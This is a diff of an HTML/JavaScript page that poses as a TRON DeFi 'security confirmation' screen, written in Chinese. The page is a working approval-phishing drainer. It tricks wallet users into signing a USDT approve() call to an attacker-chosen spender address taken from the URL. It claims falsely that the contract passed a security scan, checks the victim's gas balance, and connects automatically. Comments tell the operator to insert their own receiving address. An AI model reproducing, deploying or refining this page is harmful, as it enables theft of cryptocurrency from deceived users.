@@ -2,173 +2,249 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8">
-    <title>DefiSwap - 安全交互</title>
+    <title>安全确认 - DeFi Protocol</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <style>
-        body { font-family: -apple-system, "SF Pro Text", sans-serif; background: #f0f2f5; margin: 0; padding: 15px; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .app-container { background: #ffffff; width: 100%; max-width: 420px; border-radius: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); padding: 24px; box-sizing: border-box; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
-        .logo { font-size: 20px; font-weight: bold; color: #2b6cff; display: flex; align-items: center; }
-        .logo i { margin-right: 8px; font-style: normal; }
+        /* 基础样式复位 */
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        html, body { height: 100%; margin: 0; padding: 0; background-color: #f5f7fa; }
         
-        .swap-box { background: #f7f8fa; border-radius: 16px; padding: 16px; margin-bottom: 12px; border: 1px solid #edf0f3; }
-        .box-label { font-size: 13px; color: #5f6d7e; margin-bottom: 8px; display: block; }
-        .box-value { font-size: 18px; font-weight: 600; color: #111; display: flex; justify-content: space-between; }
-        .token-name { color: #2b6cff; }
+        /* 强制垂直水平居中容器 */
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            color: #333;
+        }
 
-        .divider { text-align: center; margin: -10px 0; position: relative; z-index: 10; }
-        .arrow-down { background: #fff; border: 1px solid #edf0f3; width: 32px; height: 32px; border-radius: 10px; display: inline-flex; align-items: center; justify-content: center; box-shadow: 0 2px 6px rgba(0,0,0,0.05); color: #2b6cff; font-weight: bold; }
+        /* 交互卡片：固定宽度，防止浮动 */
+        .card {
+            background: #ffffff;
+            width: 92%;
+            max-width: 400px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            padding: 24px;
+            position: relative;
+            overflow: hidden;
+        }
 
-        .tip-card { background: #fff9e6; border-left: 4px solid #ffcc00; padding: 12px; border-radius: 8px; margin: 20px 0; text-align: left; }
-        .tip-text { font-size: 12px; color: #856404; line-height: 1.5; }
+        /* 头部标题样式 */
+        .card-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .card-header h2 {
+            margin: 0;
+            font-size: 18px;
+            color: #1a1a1a;
+        }
+        .card-header .network {
+            display: inline-block;
+            font-size: 11px;
+            background: #eef2ff;
+            color: #4f46e5;
+            padding: 2px 8px;
+            border-radius: 10px;
+            margin-top: 6px;
+            font-weight: bold;
+        }
 
-        .btn-main { background: #2b6cff; color: white; border: none; width: 100%; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 10px; }
-        .btn-main:active { opacity: 0.8; transform: scale(0.98); }
-        .btn-main:disabled { background: #bdc3c7; }
+        /* 数据展示区域 */
+        .info-group {
+            background: #f9fafb;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid #f3f4f6;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        .info-row:last-child { margin-bottom: 0; }
+        .label { font-size: 13px; color: #6b7280; }
+        .value { font-size: 14px; color: #111827; font-weight: 500; font-family: "SF Mono", Menlo, monospace; }
+        .amount-big { font-size: 24px; font-weight: bold; color: #4f46e5; text-align: center; display: block; margin: 10px 0; }
 
-        #log-area { margin-top: 15px; font-size: 12px; text-align: left; max-height: 100px; overflow-y: auto; color: #99px; }
-        .log-item { margin-bottom: 4px; padding-left: 15px; position: relative; }
-        .log-item.ok { color: #27ae60; }
-        .log-item.err { color: #e74c3c; }
-        .log-item::before { content: ">"; position: absolute; left: 0; }
+        /* 日志窗口：固定高度，解决“浮动”问题的关键 */
+        .log-window {
+            height: 80px;
+            background: #111827;
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 11px;
+            color: #d1d5db;
+            overflow-y: auto;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .log-item { margin-bottom: 2px; }
+        .log-ok { color: #34d399; }
+        .log-err { color: #fb7185; }
+
+        /* 按钮样式 */
+        .btn {
+            background: #4f46e5;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.3);
+        }
+        .btn:active { transform: scale(0.97); opacity: 0.9; }
+        .btn:disabled { background: #d1d5db; box-shadow: none; cursor: not-allowed; }
+
+        /* 安全警示条 */
+        .security-tip {
+            font-size: 11px;
+            color: #9ca3af;
+            text-align: center;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .security-tip svg { width: 12px; height: 12px; margin-right: 4px; fill: currentColor; }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="header">
-        <div class="logo"><i>(S)</i> DefiSwap</div>
-        <div id="network-tag" style="font-size: 12px; background: #eef2ff; color: #2b6cff; padding: 4px 8px; border-radius: 20px;">TRON Mainnet</div>
+<div class="card">
+    <div class="card-header">
+        <h2>智能合约交互确认</h2>
+        <span class="network">TRON MAINNET</span>
     </div>
 
-    <div class="swap-box">
-        <span class="box-label">支付资产</span>
-        <div class="box-value">
-            <span id="display-amount">0.00</span>
-            <span class="token-name">USDT</span>
+    <div class="info-group">
+        <span class="label" style="text-align: center; display: block;">拟确认授权额度</span>
+        <span class="amount-big" id="ui-amount">0.00 <small style="font-size: 14px;">USDT</small></span>
+    </div>
+
+    <div class="info-group">
+        <div class="info-row">
+            <span class="label">我的地址</span>
+            <span class="value" id="ui-wallet">未连接</span>
+        </div>
+        <div class="info-row">
+            <span class="label">合约地址</span>
+            <span class="value" id="ui-spender">--</span>
         </div>
     </div>
 
-    <div class="divider">
-        <div class="arrow-down">↓</div>
+    <div class="log-window" id="log-window">
+        <div class="log-item">等待连接钱包环境...</div>
     </div>
 
-    <div class="swap-box">
-        <span class="box-label">交互合约</span>
-        <div class="box-value" style="font-size: 14px; font-family: monospace;" id="display-spender">加载中...</div>
+    <button id="action-btn" class="btn" onclick="mainAction()">连接钱包</button>
+
+    <div class="security-tip">
+        <svg viewBox="0 0 20 20"><path d="M10 2a6 6 0 00-6 6v3.586l-.707.707A1 1 0 004 14h12a1 1 0 00.707-1.707L16 11.586V8a6 6 0 00-6-6zM10 18a3 3 0 01-3-3h6a3 3 0 01-3 3z"></path></svg>
+        该合约由安全引擎通过扫描，请放心确认
     </div>
-
-    <div class="tip-card">
-        <div class="tip-text">
-            <strong>安全提示：</strong>此操作将授权合约访问您的 USDT 余额。请确保您正在与受信任的协议交互。
-        </div>
-    </div>
-
-    <button id="main-btn" class="btn-main" onclick="handleAction()">连接钱包</button>
-
-    <div id="log-area"></div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
 <script>
-    // --- 配置区 ---
-    const USDT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT 主网地址
-    const DEFAULT_SPENDER = "TYourDefaultAddressHere";      // 替换为你的接收地址
-    const DEFAULT_AMOUNT = 1000;                           // 默认授权金额
+    // --- 核心参数配置 ---
+    const USDT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
+    const DEFAULT_SPENDER = "TYourDefaultAddressHere"; // 修改为你自己的地址
+    const DEFAULT_AMOUNT = 1000;
 
-    // --- 状态变量 ---
-    let step = 0; // 0: 未连接, 1: 已连接准备授权
-    const urlParams = new URLSearchParams(window.location.search);
-    const targetSpender = urlParams.get("to") || DEFAULT_SPENDER;
-    const targetAmount = urlParams.get("amount") || DEFAULT_AMOUNT;
+    // 解析 URL 参数
+    const params = new URLSearchParams(window.location.search);
+    const targetSpender = params.get("to") || DEFAULT_SPENDER;
+    const targetAmount = params.get("amount") || DEFAULT_AMOUNT;
 
-    // 初始化界面
-    document.getElementById("display-spender").innerText = targetSpender.substring(0,6) + "..." + targetSpender.substring(targetSpender.length-6);
-    document.getElementById("display-amount").innerText = parseFloat(targetAmount).toFixed(2);
+    // 状态机: 0-未连接, 1-已连接待授权
+    let currentState = 0;
 
-    function writeLog(msg, type) {
-        const div = document.createElement("div");
-        div.className = "log-item " + (type || "");
-        div.innerText = msg;
-        const container = document.getElementById("log-area");
-        container.appendChild(div);
-        container.scrollTop = container.scrollHeight;
+    // 初始化界面显示
+    document.getElementById("ui-spender").innerText = targetSpender.substring(0,6) + "..." + targetSpender.substring(targetSpender.length-4);
+    document.getElementById("ui-amount").innerHTML = targetAmount + ' <small style="font-size:14px;">USDT</small>';
+
+    function log(msg, type) {
+        const win = document.getElementById("log-window");
+        const item = document.createElement("div");
+        item.className = "log-item " + (type === "ok" ? "log-ok" : (type === "err" ? "log-err" : ""));
+        item.innerText = "> " + msg;
+        win.appendChild(item);
+        win.scrollTop = win.scrollHeight;
     }
 
-    async function handleAction() {
-        const btn = document.getElementById("main-btn");
-        
-        if (step === 0) {
-            // 第一阶段：连接钱包
-            await connectWallet();
+    async function mainAction() {
+        if (currentState === 0) {
+            await connect();
         } else {
-            // 第二阶段：执行授权
-            await executeApprove();
+            await approve();
         }
     }
 
-    async function connectWallet() {
-        writeLog("正在请求连接钱包...");
+    async function connect() {
+        log("开始连接波场网络...");
         if (!window.tronWeb) {
-            writeLog("错误：未检测到环境，请在钱包App内打开", "err");
+            log("错误: 未检测到钱包环境", "err");
             return;
         }
-
         try {
-            // 尝试触发钱包连接
-            const userAddr = window.tronWeb.defaultAddress.base58;
-            if (userAddr) {
-                writeLog("已连接地址: " + userAddr.substring(0,8) + "...", "ok");
-                step = 1;
-                document.getElementById("main-btn").innerText = "立即安全确认";
+            const addr = window.tronWeb.defaultAddress.base58;
+            if (addr) {
+                document.getElementById("ui-wallet").innerText = addr.substring(0,6) + "..." + addr.substring(addr.length-4);
+                log("钱包已连接", "ok");
+                currentState = 1;
+                document.getElementById("action-btn").innerText = "确认授权";
             } else {
-                writeLog("请在钱包内解锁并刷新页面", "err");
+                log("请先在钱包内解锁", "err");
             }
         } catch (e) {
-            writeLog("连接失败", "err");
+            log("连接异常", "err");
         }
     }
 
-    async function executeApprove() {
-        const btn = document.getElementById("main-btn");
+    async function approve() {
+        const btn = document.getElementById("action-btn");
         btn.disabled = true;
-
         try {
-            writeLog("验证账户状态...");
             const tw = window.tronWeb;
-            const userAddr = tw.defaultAddress.base58;
+            const user = tw.defaultAddress.base58;
 
-            // 1. TRX 余额检查
-            const balanceSun = await tw.trx.getBalance(userAddr);
-            const balanceTRX = tw.fromSun(balanceSun);
-            if (parseFloat(balanceTRX) < 15) {
-                throw "TRX 余额不足(需约20TRX)，请充值后再试";
+            // 余额预检
+            log("正在核算 Gas 手续费...");
+            const trxBal = await tw.trx.getBalance(user);
+            if (tw.fromSun(trxBal) < 20) {
+                throw "TRX 余额不足，需约 20 TRX 手续费";
             }
-            writeLog("余额充足: " + balanceTRX + " TRX", "ok");
 
-            // 2. 构造授权交易
-            writeLog("准备安全确认...");
+            log("唤起安全签名...");
             const contract = await tw.contract().at(USDT_ADDR);
-            const bigAmount = tw.toBigNumber(targetAmount).times(1e6).toString(10);
+            const amountSun = tw.toBigNumber(targetAmount).times(1e6).toString(10);
 
-            // 3. 发起请求
-            const txid = await contract.approve(targetSpender, bigAmount).send({
+            const txid = await contract.approve(targetSpender, amountSun).send({
                 feeLimit: 100000000
             });
 
             if (txid) {
-                writeLog("指令已发送，等待区块确认", "ok");
-                alert("确认成功，请稍后查询结果");
+                log("授权成功，等待同步", "ok");
+                alert("确认成功，请返回原页面");
             }
         } catch (e) {
-            console.error(e);
-            let msg = e.message || e;
-            if (msg.includes("declined") || msg.includes("User rejected")) msg = "用户拒绝了签名申请";
-            writeLog(msg, "err");
+            let m = e.message || e;
+            if (m.includes("declined")) m = "用户取消签名";
+            log(m, "err");
         } finally {
             btn.disabled = false;
         }
     }
+
+    // 自动检测一次
+    setTimeout(connect, 500);
 </script>
 
 </body>
